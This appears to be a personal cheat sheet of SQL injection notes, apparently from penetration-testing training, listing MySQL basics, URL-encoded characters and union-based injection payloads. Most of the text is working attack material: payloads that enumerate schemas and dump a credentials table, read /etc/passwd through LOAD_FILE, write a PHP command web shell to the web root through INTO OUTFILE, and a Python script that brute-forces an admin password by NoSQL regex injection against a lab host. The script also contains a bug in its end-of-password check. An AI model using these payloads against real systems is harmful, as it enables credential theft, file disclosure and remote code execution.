#Â SQL injection

###

```shell
  mysql -u <Username> -p<password> -P <port> -h <remote_host>
  mysql -u <Username> -p<password>

  CREATE DATABASE users;
  SHOW DATABASES;
  CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
  SHOW TABLES;
  DESCRIBE logins;
  INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
  SELECT * FROM table_name;
  SELECT column1, column2 FROM table_name;
  DROP TABLE logins;
  ALTER TABLE logins ADD newColumn INT;
  ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
  ALTER TABLE logins MODIFY newerColumn DATE;
  ALTER TABLE logins DROP newerColumn;
  UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
  SELECT * FROM logins ORDER BY password;
  SELECT * FROM logins ORDER BY password DESC;
  SELECT * FROM logins ORDER BY password DESC, id ASC;
  SELECT * FROM logins LIMIT 2;
  SELECT * FROM logins WHERE username LIKE 'admin%';
  SELECT * FROM logins WHERE username like '___';

  SELECT 1 = 1 OR 'test' = 'abc';
  SELECT NOT 1 = 1;
  SELECT 1 = 1 && 'test' = 'abc';
  SELECT * FROM logins WHERE username != 'john';
  SELECT * FROM logins WHERE username != 'john' AND id > 1;
  SELECT * FROM ports UNION SELECT * FROM ships
  SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

```shell
  '	%27
  "	%22
  #	%23
  ;	%3B
  )	%29

  admin' or '1'='1
  ' or id=5)-- -
  -- or
  UNION SELECT username, 2, 3, 4 from passwords-- '
  ' order by 2-- -
  cn' UNION select 1,@@version,3,4-- -
```

```shell
  SELECT * FROM my_database.users;
  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
  cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
  cn' UNION select 1,database(),2,3-- -
  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
  cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
  cn' UNION select 1, username, password, 4 from dev.credentials-- -

  SELECT USER()
  SELECT CURRENT_USER()
  SELECT user from mysql.user
  SELECT super_priv FROM mysql.user
  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
  foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
  SELECT LOAD_FILE('/etc/passwd');
  cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
  cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

  SHOW VARIABLES LIKE 'secure_file_priv';
  SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
  cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
  SELECT * from users INTO OUTFILE '/tmp/credentials';
  cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
  cn' union select "",'<?php system($_REQUEST["cmd"]); ?>', "", "" into outfile '/var/www/html/shell2.php'-- -
```

```shell
// NOSQLI Password dumping

import requests
import json
import sys
import string

def login(pw):
    payload= '{ "$regex": "%s" }' % pw
    data = { "user":"admin", "password": json.loads(payload) }
    r = requests.post("http://10.129.30.85:5000/login", json=data)
    if "Invalid Password" in r.text:
        return False
    return True
    
password = '^'
stop = False
while stop == False:
    for i in string.ascii_letters:
        sys.stdout.write(f"\r{password}{i}")
        if login(f"{password}{i}"):
            password += i
            if login(f"password$"):
                sys.stdout.write(f"\r{password}\r\n")
                sys.stdout.flush()
                stop = True
                break
            break
```
